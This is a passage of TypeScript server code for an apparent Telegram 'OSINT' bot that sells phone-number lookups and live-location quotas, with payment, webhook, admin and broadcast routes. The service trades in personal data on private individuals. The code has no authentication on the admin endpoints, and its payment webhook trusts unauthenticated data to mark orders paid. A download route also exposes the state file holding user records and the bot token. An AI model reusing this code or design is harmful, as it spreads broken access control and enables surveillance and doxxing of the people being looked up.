    if (!isVip) {
      user.credits = Math.max(0, dailyLimit - user.dailyLookupsUsed);
    }
    user.totalLookups += 1;
    recordLookupHistory(user, info, 'web');
    addLog('LOOKUP', `Lookup for ${info.rawDigits} (${info.records[0]?.name || 'OK'})`, user.id, user.firstName);

    res.json({ info, user });
  });

  app.post('/api/payment/create', async (req, res) => {
    const { userId = 6672896116, planId } = req.body;
    const user = getOrCreateUser({ id: Number(userId), first_name: 'Hexx User' });
    const plan =
      state.config.plans.find((p) => p.id === planId) ||
      state.config.plans[0];
    if (!plan) return res.status(404).json({ error: 'Pricing plan not found' });

    const order = await createFamGatewayOrder(user, plan);
    res.json({ order });
  });

  app.post('/api/payment/verify', async (req, res) => {
    const { orderId, forceImap } = req.body;
    const order = state.orders[orderId];
    if (!order) return res.status(404).json({ error: 'Order not found' });

    const result = await checkFamGatewayOrderStatus(order, Boolean(forceImap));
    const user = state.users[String(order.userId)];
    res.json({ ok: result.paid, ...result, order, user });
  });

  const handleFamGatewayWebhook = async (req: express.Request, res: express.Response) => {
    try {
      const payload = { ...(req.query || {}), ...(req.body || {}) };
      const incomingOrderId = String(payload.order_id || payload.orderId || payload.client_txn_id || '').trim();
      const status = String(payload.status || payload.txn_status || payload.order_status || '').toUpperCase();
      const utr = String(payload.utr || payload.bank_rrn || payload.upi_txn_id || 'FAMGATEWAY_WEBHOOK').trim();

      if (incomingOrderId) {
        const order =
          state.orders[incomingOrderId] ||
          Object.values(state.orders).find((o) => resolveFamOrderId(o) === incomingOrderId);

        if (order && (status === 'SUCCESS' || status === 'PAID' || status === 'COMPLETED')) {
          fulfillOrder(order, utr);
          const user = state.users[String(order.userId)];
          if (user && user.lastBotMessageId) {
            void editSectionInPlace(order.userId, user.lastBotMessageId, user, renderBotProfileView(user));
          }
          return res.json({ status: 'ok', message: 'Order fulfilled via webhook' });
        }
      }
      res.json({ status: 'received' });
    } catch (err: any) {
      res.status(500).json({ status: 'error', message: err.message });
    }
  };

  app.post('/api/famgateway/webhook', handleFamGatewayWebhook);
  app.get('/api/famgateway/webhook', handleFamGatewayWebhook);

  app.get('/api/admin/overview', (_req, res) => {
    const { allUsers, premiumUsers, paidOrders, pendingOrders, totalEarnings, todayEarnings } = getAdminStats();
    const totalSearches = allUsers.reduce((acc, u) => acc + (u.totalLookups || 0), 0);

    res.json({
      botStatus,
      config: state.config,
      users: allUsers.sort(
        (a, b) => new Date(b.lastActiveAt).getTime() - new Date(a.lastActiveAt).getTime()
      ),
      orders: Object.values(state.orders).sort(
        (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
      ),
      globalHistory: state.globalHistory,
      searchHistory: state.globalHistory,
      promoCodes: state.config.redeemCodes,
      logs: state.logs,
      stats: {
        totalUsers: allUsers.length,
        premiumUsers: premiumUsers.length,
        totalEarnings,
        todayEarnings,
        totalSearches,
        paidOrders: paidOrders.length,
        pendingOrders: pendingOrders.length,
        botOnline: botStatus.connected,
        botUsername: botStatus.username || state.config.botUsername,
      },
    });
  });

  app.post('/api/admin/config', async (req, res) => {
    const incoming = (req.body?.config ? req.body.config : req.body) as Partial<BotConfig>;
    const tokenChanged = incoming.botToken && incoming.botToken !== state.config.botToken;

    if (incoming.bannerUrl) {
      incoming.bannerUrl = await resolveBannerImageUrlAsync(incoming.bannerUrl);
      state.config.telegramFileId = undefined;
    }

    const updatedDailyLimit =
      typeof incoming.dailyLookupLimit === 'number'
        ? incoming.dailyLookupLimit
        : typeof incoming.defaultTrialCredits === 'number'
        ? incoming.defaultTrialCredits
        : state.config.dailyLookupLimit ?? state.config.defaultTrialCredits ?? 2;

    const updatedLiveLimit =
      typeof incoming.liveLocationLifetimeLimit === 'number'
        ? incoming.liveLocationLifetimeLimit
        : state.config.liveLocationLifetimeLimit ?? 1;

    state.config = {
      ...state.config,
      ...incoming,
      dailyLookupLimit: updatedDailyLimit,
      defaultTrialCredits: updatedDailyLimit,
      liveLocationLifetimeLimit: updatedLiveLimit,
      miniAppUrl: incoming.websiteUrl || incoming.miniAppUrl || state.config.websiteUrl || 'https://famgateway.in',
      websiteUrl: incoming.websiteUrl || incoming.miniAppUrl || state.config.websiteUrl || 'https://famgateway.in',
    };

    for (const u of Object.values(state.users)) {
      if (!u.isPremium) {
        u.dailyLimit = updatedDailyLimit;
        u.credits = Math.max(0, updatedDailyLimit - (u.dailyLookupsUsed || 0));
        u.liveLocationLimit = updatedLiveLimit;
      }
    }

    saveState();
    addLog('ADMIN', 'Updated bot, Daily Limit, Live Location Limit & Group configuration');

    if (tokenChanged) {
      await verifyBotConnection();
    }
    res.json({ ok: true, config: state.config, botStatus });
  });

  app.post('/api/admin/grant-by-username', (req, res) => {
    const { identifier, days = 0, credits = 0, revokeVip = false } = req.body;
    const target = resolveUserByIdentifier(String(identifier || ''));
    if (!target) {
      return res.status(404).json({ error: 'User not found' });
    }
    if (revokeVip) {
      target.isPremium = false;
      target.premiumUntil = null;
    }
    if (Number(days) > 0) {
      const now = new Date();
      const base = target.premiumUntil && new Date(target.premiumUntil) > now ? new Date(target.premiumUntil) : now;
      base.setDate(base.getDate() + Number(days));
      target.isPremium = true;
      target.premiumUntil = base.toISOString();
      target.lastPlanName = `${days} Days Admin VIP`;
    }
    if (Number(credits) !== 0) {
      target.credits = Math.max(0, target.credits + Number(credits));
      target.dailyLimit = Math.max(0, getUserDailyLimit(target) + Number(credits));
    }
    saveState();
    addLog(
      'ADMIN',
      `Updated @${target.username || target.id}: +${days}D VIP, +${credits} Credits`,
      target.id,
      target.firstName
    );
    res.json({ ok: true, user: target, users: Object.values(state.users) });
  });

  app.post('/api/admin/user-action', (req, res) => {
    const { userId, action, value = 0, planName } = req.body;
    const target = resolveUserByIdentifier(String(userId || ''));
    if (!target) return res.status(404).json({ error: 'User not found' });

    if (action === 'grant_days') {
      const days = Math.max(1, Number(value || 7));
      const now = new Date();
      const base = target.premiumUntil && new Date(target.premiumUntil) > now ? new Date(target.premiumUntil) : now;
      base.setDate(base.getDate() + days);
      target.isPremium = true;
      target.premiumUntil = base.toISOString();
      target.lastPlanName = planName || `${days} Days VIP`;
    } else if (action === 'add_credits') {
      target.credits = Math.max(0, target.credits + Number(value || 2));
      target.dailyLimit = Math.max(0, getUserDailyLimit(target) + Number(value || 2));
    } else if (action === 'set_daily_limit') {
      const newLim = Math.max(0, Number(value));
      target.dailyLimit = newLim;
      target.dailyLookupsUsed = 0;
      target.credits = newLim;
    } else if (action === 'reset_daily') {
      target.dailyLookupsUsed = 0;
      target.credits = getUserDailyLimit(target);
      target.liveLocationUsed = 0;
    } else if (action === 'toggle_ban') {
      target.isBanned = !target.isBanned;
    } else if (action === 'revoke_vip') {
      target.isPremium = false;
      target.premiumUntil = null;
    }
    saveState();
    res.json({ ok: true, user: target });
  });

  app.post('/api/admin/promo', (req, res) => {
    const { code, rewardDays = 0, rewardCredits = 0, maxUses = 100 } = req.body;
    const cleanCode = String(code || '').trim().toUpperCase();
    if (!cleanCode) return res.status(400).json({ error: 'Invalid code' });
    state.config.redeemCodes = state.config.redeemCodes.filter((c) => c.code !== cleanCode);
    state.config.redeemCodes.unshift({
      code: cleanCode,
      vipDays: Number(rewardDays) || 0,
      credits: Number(rewardCredits) || 0,
      maxUses: Number(maxUses) || 100,
      usedBy: [],
      createdAt: new Date().toISOString(),
    });
    saveState();
    res.json({ ok: true, promoCodes: state.config.redeemCodes });
  });

  app.post('/api/admin/order/approve', (req, res) => {
    const { orderId } = req.body;
    const order = state.orders[orderId];
    if (!order) return res.status(404).json({ error: 'Order not found' });

    fulfillOrder(order, 'ADMIN_MANUAL_APPROVAL');
    res.json({ ok: true, order, user: state.users[String(order.userId)] });
  });

  app.post('/api/admin/broadcast', async (req, res) => {
    const { message } = req.body;
    if (!message || !String(message).trim()) {
      return res.status(400).json({ error: 'Broadcast message cannot be empty' });
    }
    const users = Object.values(state.users);
    let sentCount = 0;
    for (const u of users) {
      if (typeof u.id === 'number' && u.id < 900000000) {
        try {
          const r = await callTelegram('sendMessage', {
            chat_id: u.id,
            text: `<b>⟐ ${escapeHtml(toThinSans(state.config.botName))}</b>\n\n${escapeHtml(String(message))}`,
            parse_mode: 'HTML',
          });
          if (r?.ok) sentCount++;
        } catch {
          // continue
        }
      }
    }
    addLog('ADMIN', `Broadcast sent to ${sentCount}/${users.length} users`);
    res.json({ ok: true, sentCount, totalUsers: users.length });
  });

  app.get('/api/download-bot-file/:filename', (req, res) => {
    const allowed: Record<string, string> = {
      'server.ts': path.join(process.cwd(), 'server.ts'),
      'package.json': path.join(process.cwd(), 'package.json'),
      'bot.yml': path.join(process.cwd(), '.github', 'workflows', 'bot.yml'),
      'hexx_store_v12.json': path.join(process.cwd(), 'hexx_store_v12.json'),
    };
    const fileKey = req.params.filename;
    const targetPath = allowed[fileKey];
    if (!targetPath || !fs.existsSync(targetPath)) {
      return res.status(404).json({ error: 'File not found' });
    }
    res.setHeader('Content-Disposition', `attachment; filename="${fileKey}"`);
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.sendFile(targetPath);
  });

  const hasIndexHtml = fs.existsSync(path.join(process.cwd(), 'index.html'));
  if (process.env.NODE_ENV !== 'production' && hasIndexHtml) {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    const distIndex = path.join(distPath, 'index.html');
    if (fs.existsSync(distIndex)) {
      app.use(express.static(distPath));
      app.get('*all', (_req, res) => {
        res.sendFile(distIndex);
      });
    } else {
      app.get('/', (_req, res) => {
        res.json({ ok: true, bot: state.config.botUsername, status: 'running_24x7' });
      });
    }
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Hexx OSINT Bot (@HexxOsint_bot) running on http://localhost:${PORT}`);
  });
}

startServer();
